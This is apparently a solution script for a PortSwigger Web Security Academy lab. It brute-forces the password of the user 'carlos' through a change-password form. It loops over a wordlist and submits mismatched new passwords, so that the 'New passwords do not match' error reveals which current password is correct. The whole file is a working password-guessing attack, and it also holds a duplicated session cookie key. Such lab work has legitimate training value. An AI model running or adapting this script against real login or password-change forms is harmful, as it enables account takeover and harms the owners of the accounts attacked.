import requests

"""


"""

import requests

url = "https://0a0d00ce0335c6009.web-security-academy.net/my-account/change-password"            # add your url with path

cookies={
    "session":"BzMHFxLvhlQdXteSLymT6w7cY",                   # add your cookies
    "session":"SBU2yeZFUh7aBdA1eV9K2Bmf"                    # add your cookies

}

found = False

with open('/PortSwigger/passwords.txt','r') as f:          # add your list
    for passwd in f:
        passwd = passwd.strip()

        data = {
            "username": "carlos",
            "current-password": passwd,
            "new-password-1": "a",  
            "new-password-2": "aa"
        }

        response = requests.post(url ,cookies=cookies, data=data, allow_redirects=False)

        if "Current password is incorrect" in response.text:
            print(f"[-] Tried: {passwd} | Incorrect")
        elif "New passwords do not match" in response.text:
            print(f"[+] FOUND! Valid current password for carlos is: {passwd}")
            found = True
            break
        else:
            print(f"[?] Unexpected response for: {passwd} | Status: {response.status_code}")

if not found:
    print("[!] Password not found in the provided list.")
